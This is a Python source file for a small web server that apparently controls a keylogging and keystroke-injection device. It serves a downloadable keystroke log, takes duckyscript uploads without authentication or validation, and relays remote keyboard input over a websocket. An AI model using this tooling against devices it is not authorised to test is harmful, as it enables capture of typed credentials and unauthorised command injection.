import os
from microdot import Microdot, send_file, Response
from microdot.websocket import WebSocketError, with_websocket
from queue import Queue

FILE_PATH = "log.txt"


def file_exists():
    try:
        os.stat(FILE_PATH)
        return True
    except OSError:
        return False


homepage = """
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      display: flex;
      justify-content: center; /* Horizontal centering */
      align-items: center;     /* Vertical centering */
      min-height: 100vh;       /* Full screen height */
      font-family: sans-serif;
    }

    button {
      padding: 12px 24px;      /* Better "tap target" for fingers */
      font-size: 16px;         /* Prevents iOS zoom-on-focus */
      width: auto;
      max-width: 90%;          /* Ensures it doesn't hit screen edges */
      cursor: pointer;
    }
  </style>
</head>
<body>
  <a href="/log">
    <button>Download Log</button>
  </a>
</body>
</html>
"""

class DuckLoggerAPI:
    """wraper for microdot, with two public queues:
     - keys:  for storing incoming keys from remote kbd
     - script: for storing incoming duckyscripts
    """
    def __init__(self) -> None:
        self.app = Microdot()
        self.keys = Queue()
        self.scripts = Queue()
        self.setup_routes()

    def setup_routes(self):
        @self.app.route("/")
        async def index(request):
            # send HTML with proper content type
            return Response(body=homepage, headers={'Content-Type': 'text/html'})

        @self.app.route("/log")
        async def download_log(request):
            if not file_exists():
                return "<h3>404 Not Found</h3>", 404
            
            # send file as download
            return send_file(
                FILE_PATH,
                content_type="text/plain",
            )

        @self.app.route("/script", methods=["POST"])
        async def script_upload(request):
            """
            Accepts a duckyscript via POST (raw text or form data)
            and enqueues it for processing.
            """
            script_text = (await request.body()).decode("utf-8")

            # TODO: wil put validation here later
            if not script_text.strip():
                return Response("Empty script", status_code=400)

            self.scripts.enqueue(script_text)
            return Response("Script received", status_code=200)

        @self.app.route('/kbd')
        @with_websocket
        async def kbd(request, ws):
            while True:
                try:
                    message = await ws.receive()
                    self.keys.enqueue(message)
                    await ws.send(message)
                except WebSocketError:
                    break

    def start_server(self):
        """returns awaitable coroutine"""
        return self.app.start_server(host="0.0.0.0", port=80)
